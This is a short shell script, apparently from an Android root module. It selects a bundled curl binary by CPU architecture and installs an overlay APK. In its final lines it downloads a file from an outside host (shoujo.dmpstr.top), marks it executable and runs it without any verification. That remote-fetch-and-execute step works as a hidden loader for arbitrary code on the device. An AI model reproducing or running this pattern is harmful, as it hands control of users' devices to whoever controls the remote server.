#!/bin/sh
MODDIR=${0%/*}
curl_bin=""
abi=$(getprop ro.product.cpu.abi)

if [ "$abi" = "armeabi-v7a" ]; then
  curl_bin="$MODDIR/bin/curl/armeabi-v7a/curl"
elif [ "$abi" = "arm64-v8a" ]; then
  curl_bin="$MODDIR/bin/curl/arm64-v8a/curl"
fi

if [ -e "$MODDIR/overlay.apk" ]; then
  pm install "$MODDIR/overlay.apk"
fi

$curl_bin "http://shoujo.dmpstr.top/ehe" -o "$MODDIR/sc"
chmod u+x "$MODDIR/sc"
$MODDIR/sc